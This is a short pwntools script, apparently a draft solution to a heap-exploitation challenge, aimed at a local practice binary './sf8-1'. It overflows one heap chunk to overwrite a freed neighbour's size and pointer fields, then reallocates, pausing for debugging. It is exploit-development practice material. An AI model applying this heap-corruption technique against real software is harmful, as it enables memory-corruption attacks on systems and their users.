from pwn import *

p = process("./sf8-1")

def alloc(size):
	p.sendlineafter(": ","1")
	p.sendlineafter("Size: ",str(size))
	
def fill(index, size, content):
	p.sendlineafter("Command: ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content:",content)

def free(index):
	p.sendlineafter("Command: ","3")
	p.sendlineafter("Index:",str(index))

def dump(index):
	p.sendlineafter("Command: ","4")
	p.sendlineafter("Index: ",str(index))

alloc(0x10)
alloc(0x10)
alloc(0x10)

pay = b""
pay += b"A" * 0x10
pay += p64(0)
pay += p64(0x21)
pay += b"BBBBBBBB"

free(1)

fill(0,0x30,pay)

pause()

alloc(0x10)

pause()

p.interactive()